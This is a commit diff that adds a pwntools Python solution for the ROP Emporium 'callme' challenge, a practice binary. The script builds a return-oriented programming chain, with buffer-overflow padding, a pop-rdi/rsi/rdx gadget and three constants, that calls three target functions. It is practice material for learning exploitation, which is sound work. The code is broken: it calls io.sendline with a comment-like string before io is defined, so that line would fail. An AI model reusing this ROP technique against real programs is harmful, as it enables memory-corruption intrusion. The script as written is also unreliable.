5e9ce890b2c70d52165b9330c996a430c2645476
Justin Paglierani <tdaddy@pagbookair.local>
2026-03-29 21:29:38 -0400

    callme

---
+++ rop emporium/x86_64/3 - callme/solve.py
@@ -0,0 +1,67 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template callme
+from pwn import *
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF(args.EXE or 'callme')
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+
+
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+tbreak main
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# Arch:     amd64-64-little
+# RELRO:      Partial RELRO
+# Stack:      No canary found
+# NX:         NX enabled
+# PIE:        No PIE (0x400000)
+# RUNPATH:    b'.'
+# Stripped:   No
+
+RIP_DIST = 40
+
+CAFEBABE = 0xcafebabecafebabe
+DEADBEEF = 0xdeadbeefdeadbeef
+DOODFOOD = 0xd00df00dd00df00d
+
+POP_RDI_RSI_RDX = 0x000000000040093c
+
+io.sendline("args go into rdi, rsi, rdx. need to be reset between calls. they gave us a nice gadget")
+
+io = start()
+
+pause()
+
+io.sendline(cyclic(40) +
+            flat(POP_RDI_RSI_RDX) + flat(DEADBEEF) + flat(CAFEBABE) + flat(DOODFOOD) +
+            flat(exe.symbols['callme_one']) +
+            flat(POP_RDI_RSI_RDX) + flat(DEADBEEF) + flat(CAFEBABE) + flat(DOODFOOD) +
+            flat(exe.symbols['callme_two']) +
+            flat(POP_RDI_RSI_RDX) + flat(DEADBEEF) + flat(CAFEBABE) + flat(DOODFOOD) +
+            flat(exe.symbols['callme_three'])
+    )
+
+io.interactive()
+
